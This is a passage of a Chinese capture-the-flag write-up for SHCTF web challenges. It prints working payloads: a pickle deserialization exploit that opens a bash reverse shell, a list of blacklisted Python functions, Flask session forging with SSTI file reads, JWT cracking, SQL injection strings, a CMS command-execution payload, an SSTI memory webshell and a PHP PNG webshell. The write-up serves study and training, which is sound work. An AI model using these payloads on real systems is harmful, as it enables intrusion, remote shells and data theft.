class="string">&quot;data&quot;</span>]</span><br><span class="line">        decoded_data = base64.b64decode(encoded_data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data_stream = io.BytesIO(decoded_data)</span><br><span class="line">            unpickler = SafeUnpickler(data_stream)</span><br><span class="line">            result = unpickler.load()</span><br><span class="line">            <span class="keyword">return</span> f<span class="string">&quot;Deserialized data: &#123;list(result)&#125;&quot;</span></span><br><span class="line">        except Exception as e:</span><br><span class="line">            <span class="keyword">return</span> f<span class="string">&quot;Error during deserialization: &#123;str(e)&#125;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;form method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;data&quot;&gt;Enter your serialized data:&lt;/label&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;textarea id=&quot;data&quot; name=&quot;data&quot;&gt;&lt;/textarea&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
<p>这里是pickel反序列化，但是有十分多的waf</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BLACKLISTED_CLASSES = [</span><br><span class="line">    <span class="string">&#x27;subprocess.check_output&#x27;</span>,<span class="string">&#x27;builtins.eval&#x27;</span>,<span class="string">&#x27;builtins.exec&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.popen&#x27;</span>, <span class="string">&#x27;os.popen2&#x27;</span>, <span class="string">&#x27;os.popen3&#x27;</span>, <span class="string">&#x27;os.popen4&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;pickle.load&#x27;</span>, <span class="string">&#x27;pickle.loads&#x27;</span>, <span class="string">&#x27;cPickle.load&#x27;</span>, <span class="string">&#x27;cPickle.loads&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;subprocess.call&#x27;</span>, <span class="string">&#x27;subprocess.check_call&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="string">&#x27;commands.getoutput&#x27;</span>, <span class="string">&#x27;commands.getstatus&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;posixfile.open&#x27;</span>, <span class="string">&#x27;posixfile.fileopen&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>,<span class="string">&#x27;os.spawn*&#x27;</span>,<span class="string">&#x27;sh.Command&#x27;</span>,<span class="string">&#x27;imp.load_module&#x27;</span>,<span class="string">&#x27;builtins.compile&#x27;</span></span><br><span class="line">    <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;builtins.execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;builtins.open&#x27;</span>, <span class="string">&#x27;builtins.file&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;os.fdopen&#x27;</span>, <span class="string">&#x27;os.tmpfile&#x27;</span>, <span class="string">&#x27;os.fchmod&#x27;</span>, <span class="string">&#x27;os.fchown&#x27;</span>, <span class="string">&#x27;os.open&#x27;</span>, <span class="string">&#x27;os.openpty&#x27;</span>, <span class="string">&#x27;os.read&#x27;</span>, <span class="string">&#x27;os.pipe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.chdir&#x27;</span>, <span class="string">&#x27;os.fchdir&#x27;</span>, <span class="string">&#x27;os.chroot&#x27;</span>, <span class="string">&#x27;os.chmod&#x27;</span>, <span class="string">&#x27;os.chown&#x27;</span>, <span class="string">&#x27;os.link&#x27;</span>, <span class="string">&#x27;os.lchown&#x27;</span>, <span class="string">&#x27;os.listdir&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.lstat&#x27;</span>, <span class="string">&#x27;os.mkfifo&#x27;</span>, <span class="string">&#x27;os.mknod&#x27;</span>, <span class="string">&#x27;os.access&#x27;</span>, <span class="string">&#x27;os.mkdir&#x27;</span>, <span class="string">&#x27;os.makedirs&#x27;</span>, <span class="string">&#x27;os.readlink&#x27;</span>, <span class="string">&#x27;os.remove&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.removedirs&#x27;</span>, <span class="string">&#x27;os.rename&#x27;</span>, <span class="string">&#x27;os.renames&#x27;</span>, <span class="string">&#x27;os.rmdir&#x27;</span>, <span class="string">&#x27;os.tempnam&#x27;</span>, <span class="string">&#x27;os.tmpnam&#x27;</span>, <span class="string">&#x27;os.unlink&#x27;</span>, <span class="string">&#x27;os.walk&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.execl&#x27;</span>, <span class="string">&#x27;os.execle&#x27;</span>, <span class="string">&#x27;os.execlp&#x27;</span>, <span class="string">&#x27;os.execv&#x27;</span>, <span class="string">&#x27;os.execve&#x27;</span>, <span class="string">&#x27;os.dup&#x27;</span>, <span class="string">&#x27;os.dup2&#x27;</span>, <span class="string">&#x27;os.execvp&#x27;</span>, <span class="string">&#x27;os.execvpe&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.fork&#x27;</span>, <span class="string">&#x27;os.forkpty&#x27;</span>, <span class="string">&#x27;os.kill&#x27;</span>, <span class="string">&#x27;os.spawnl&#x27;</span>, <span class="string">&#x27;os.spawnle&#x27;</span>, <span class="string">&#x27;os.spawnlp&#x27;</span>, <span class="string">&#x27;os.spawnlpe&#x27;</span>, <span class="string">&#x27;os.spawnv&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;os.spawnve&#x27;</span>, <span class="string">&#x27;os.spawnvp&#x27;</span>, <span class="string">&#x27;os.spawnvpe&#x27;</span>, <span class="string">&#x27;pickle.load&#x27;</span>, <span class="string">&#x27;pickle.loads&#x27;</span>, <span class="string">&#x27;cPickle.load&#x27;</span>, <span class="string">&#x27;cPickle.loads&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;subprocess.call&#x27;</span>, <span class="string">&#x27;subprocess.check_call&#x27;</span>, <span class="string">&#x27;subprocess.check_output&#x27;</span>, <span class="string">&#x27;subprocess.Popen&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;commands.getstatusoutput&#x27;</span>, <span class="string">&#x27;commands.getoutput&#x27;</span>, <span class="string">&#x27;commands.getstatus&#x27;</span>, <span class="string">&#x27;glob.glob&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;linecache.getline&#x27;</span>, <span class="string">&#x27;shutil.copyfileobj&#x27;</span>, <span class="string">&#x27;shutil.copyfile&#x27;</span>, <span class="string">&#x27;shutil.copy&#x27;</span>, <span class="string">&#x27;shutil.copy2&#x27;</span>, <span class="string">&#x27;shutil.move&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;shutil.make_archive&#x27;</span>, <span class="string">&#x27;popen2.popen2&#x27;</span>, <span class="string">&#x27;popen2.popen3&#x27;</span>, <span class="string">&#x27;popen2.popen4&#x27;</span>, <span class="string">&#x27;timeit.timeit&#x27;</span>, <span class="string">&#x27;sys.call_tracing&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;code.interact&#x27;</span>, <span class="string">&#x27;code.compile_command&#x27;</span>, <span class="string">&#x27;codeop.compile_command&#x27;</span>, <span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;posixfile.open&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;posixfile.fileopen&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>在反序列化过程中， pickle 使用 find_class 方法来定位和导入必要的类或函数。由于 pickle 记录的是 posix.system，因此find_class 会从 posix 模块中导入 system 函数，而不是从 os 模块中导入。</p>
<p>所以可以用os.system进行序列化，但是在检测就会调用posix.system，从而绕过黑名单</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    def <span class="title function_">__reduce__</span><span class="params">(self)</span>:</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;bash -c &quot;bash -i &gt;6 /dev/tcp/ip/8888 0&gt;&amp;1&quot;&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(b))</span><br></pre></td></tr></table></figure>
<h3 id="Week2-guess-the-number"><a href="#Week2-guess-the-number" class="headerlink" title="[Week2]guess_the_number"></a>[Week2]guess_the_number</h3><p>查看源码的源码 /s0urce</p>
<p><img src="https://luokuang1.github.io/images/shctf1.png" width="95%" height="60%"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, first_num = first_num)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/s0urce&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_source</span>():</span><br><span class="line">    file_path = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(file_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/first&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_first_number</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(first_num)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/guess&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_seed</span>():</span><br><span class="line">    num = request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> num == <span class="built_in">str</span>(second_num):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            <span class="keyword">return</span> file.read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> seed, first_num, second_num</span><br><span class="line">    seed = random.randint(<span class="number">1000000</span>,<span class="number">9999999</span>)</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    first_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line">    second_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>主要看到种子这里seed = random.randint(1000000,9999999)，这里看似随机的，但是当种子确定下来时，first_num和second_num就会确定，所以，只需要通过第一个数来获得seed就可以获得第二个数值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">1000000</span>,<span class="number">9999999</span>)</span>:</span><br><span class="line">    random.seed(i)</span><br><span class="line">    first_num = random.randint(<span class="number">1000000000</span>, <span class="number">9999999999</span>)</span><br><span class="line">    <span class="keyword">if</span>(first_num==<span class="number">2750639080</span>):</span><br><span class="line">        print(random.randint(<span class="number">1000000000</span>, <span class="number">9999999999</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>再提交输出的值获取flag</p>
<h3 id="Week2-入侵者禁入"><a href="#Week2-入侵者禁入" class="headerlink" title="[Week2]入侵者禁入"></a>[Week2]入侵者禁入</h3><p>这里直接给了源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;0day_joker&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;role&#x27;</span>] = &#123;</span><br><span class="line">        <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;your_flag_here&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        code = file.read()</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        role = session.get(<span class="string">&#x27;role&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(role, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Without you, you are an intruder!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> role.get(<span class="string">&#x27;is_admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">        flag = role.get(<span class="string">&#x27;flag&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        message = <span class="string">&quot;Oh,I believe in you! The flag is: %s&quot;</span> % flag</span><br><span class="line">        <span class="keyword">return</span> render_template_string(message)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: You don&#x27;t have the power!&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>首先看到secret_key就可以知道应该是要通过session伪造了，这里需要注意它不是直接通过admin用户来获取flag，而是通过通过渲染render_template_string(message)，这里就可以尝试ssti来获取flag</p>
<p>抓包获取session值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZyiHMA.AomjARBBM3o_mXsepYp6PsZ6D8E</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/shctf2.png" width="95%" height="60%"></p>
<p>这里看到破解成功，下面就是进行伪造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s <span class="string">&quot;0day_joker&quot;</span> -t <span class="string">&quot;&#123;&#x27;role&#x27;: &#123;&#x27;flag&#x27;: &#x27;&#123;&#123;lipsum.__globals__.os.popen(\&#x27;cat /*\&#x27;).read()&#125;&#125;&#x27;, &#x27;is_admin&#x27;: 1&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>这里要注意需要通过转义才可以写，最后提交得flag</p>
<h3 id="Week2-登录验证"><a href="#Week2-登录验证" class="headerlink" title="[Week2]登录验证"></a>[Week2]登录验证</h3><p>提示里面告诉我们要jwt爆破</p>
<p>当我们提交admin admin时告诉我们不是admin</p>
<p>我们开头将jwt码进行爆破</p>
<p><img src="https://luokuang1.github.io/images/shctf3.png" width="95%" height="60%"></p>
<p>这里爆破出来为222333，将原来的jwt码进行伪造改role为admin即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzA3MTk0NzEsImlhdCI6MTczMDcxMjI3MSwibmJmIjoxNzMwNzEyMjcxLCJyb2xlIjoiYWRtaW4ifQ.84vkkeMmFt9dr2RBVhH1TciO69Y4mXPq0cm27Dst9Fo</span><br></pre></td></tr></table></figure>
<p>最后直接提交即可得flag</p>
<h3 id="Week2-自助查询"><a href="#Week2-自助查询" class="headerlink" title="[Week2]自助查询"></a>[Week2]自助查询</h3><p>这个题注入没有过滤，主要是最后一步要注意</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&quot;) group by 2#</span></span><br><span class="line"><span class="string">0&quot;</span>) union select <span class="number">1</span>,group_concat(table_name) from information_schema.tables where table_schema=database()# <span class="comment">//flag,users</span></span><br><span class="line"><span class="number">0</span><span class="string">&quot;) union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;# //id,scretdata</span></span><br><span class="line"><span class="string">0&quot;</span>) union select <span class="number">1</span>,group_concat(scretdata) from flag# <span class="comment">//被你查到了, 果然不安全,把重要的东西写在注释就不会忘了</span></span><br></pre></td></tr></table></figure>
<p>这里需要查看注释来获取flag</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&quot;) union SELECT column_name, column_comment FROM information_schema.columns WHERE table_schema = database() AND table_name = &#x27;flag&#x27;#</span></span><br></pre></td></tr></table></figure>
<h3 id="Week3-小小cms"><a href="#Week3-小小cms" class="headerlink" title="[Week3] 小小cms"></a>[Week3] 小小cms</h3><p>这个是用到cms漏洞，直接用payload即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">目录 /pay/index/pay_callback</span><br><span class="line"></span><br><span class="line">post提交：out_trade_no[<span class="number">0</span>]=eq&amp;out_trade_no[<span class="number">1</span>]=cat <span class="comment">/*&amp;out_trade_no[2]=system</span></span><br></pre></td></tr></table></figure>
<h3 id="Week3-love-flask"><a href="#Week3-love-flask" class="headerlink" title="[Week3] love_flask"></a>[Week3] love_flask</h3><p>下载源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"># Flask <span class="number">2.0</span><span class="number">.1</span></span><br><span class="line"># Werkzeug <span class="number">2.2</span><span class="number">.2</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">html_template = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;Pretty Input Box&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">  .pretty-input &#123;</span></span><br><span class="line"><span class="string">    width: 100%;</span></span><br><span class="line"><span class="string">    padding: 10px 20px;</span></span><br><span class="line"><span class="string">    margin: 20px 0;</span></span><br><span class="line"><span class="string">    font-size: 16px;</span></span><br><span class="line"><span class="string">    border: 1px solid #ccc;</span></span><br><span class="line"><span class="string">    border-radius: 25px;</span></span><br><span class="line"><span class="string">    box-sizing: border-box;</span></span><br><span class="line"><span class="string">    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);</span></span><br><span class="line"><span class="string">    transition: border 0.3s ease-in-out;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  .pretty-input:focus &#123;</span></span><br><span class="line"><span class="string">    border-color: #4CAF50;</span></span><br><span class="line"><span class="string">    outline: none;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  .submit-button &#123;</span></span><br><span class="line"><span class="string">    width: 100%;</span></span><br><span class="line"><span class="string">    padding: 10px 20px;</span></span><br><span class="line"><span class="string">    margin: 20px 0;</span></span><br><span class="line"><span class="string">    font-size: 16px;</span></span><br><span class="line"><span class="string">    color: white;</span></span><br><span class="line"><span class="string">    background-color: #4CAF50;</span></span><br><span class="line"><span class="string">    border: none;</span></span><br><span class="line"><span class="string">    border-radius: 25px;</span></span><br><span class="line"><span class="string">    cursor: pointer;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  .container &#123;</span></span><br><span class="line"><span class="string">    max-width: 300px;</span></span><br><span class="line"><span class="string">    margin: auto;</span></span><br><span class="line"><span class="string">    text-align: center;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;/namelist&quot; method=&quot;get&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;text&quot; class=&quot;pretty-input&quot; name=&quot;name&quot; placeholder=&quot;Enter your name...&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; class=&quot;submit-button&quot; value=&quot;Submit&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_">pretty_input</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_template)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&#x27;/namelist&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def <span class="title function_">name_list</span><span class="params">()</span>:</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)  </span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27;</span> % <span class="type">name</span></span><br><span class="line">    <span class="variable">rendered_string</span> <span class="operator">=</span>  render_template_string(template)</span><br><span class="line">    <span class="keyword">if</span> rendered_string:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Success Write your name to database&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
<p>这里发现存在ssti，但是没有会显，这里就可以产生通过内存马来进行回显，这里注意在打内存马时，如果已经创建了目录时就会报错，所以每次进行打内存马时就需要修改目录路径</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/bbb&#x27;, &#x27;bbb&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;cat /*&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Week3-拜师之旅·番外"><a href="#Week3-拜师之旅·番外" class="headerlink" title="[Week3] 拜师之旅·番外"></a>[Week3] 拜师之旅·番外</h3><p>这个题考图片马得二次渲染</p>
<p><img src="https://luokuang1.github.io/images/shctf4.png" width="95%" height="60%"></p>
<p>这个题只可以上传png文件，这里无法通过请求头和图片标识符来绕过，只能通过直接上传png文件来进行绕过，生成png图片的php代码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">             <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">             <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">             <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">             <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">             <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">             <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">             <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">  <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">  <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">  <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行这个php文件就会生成一个1.png文件，直接下来进行上传，post提交来进行执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">/view.php?image=/upload/<span class="number">1924555906.</span>png&amp;<span class="number">0</span>=system</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=ls /</span><br></pre></td></tr></table></figure>
<h3 id="Week3-hacked-website"><a href="#Week3-hacked-website" class="headerlink" title="[Week3] hacked_website"></a>[Week3] hacked_website</h3><p>这里会给一个备份文件</p>
<p>打开后发现在/admin/profile.php中有一个后门</p>
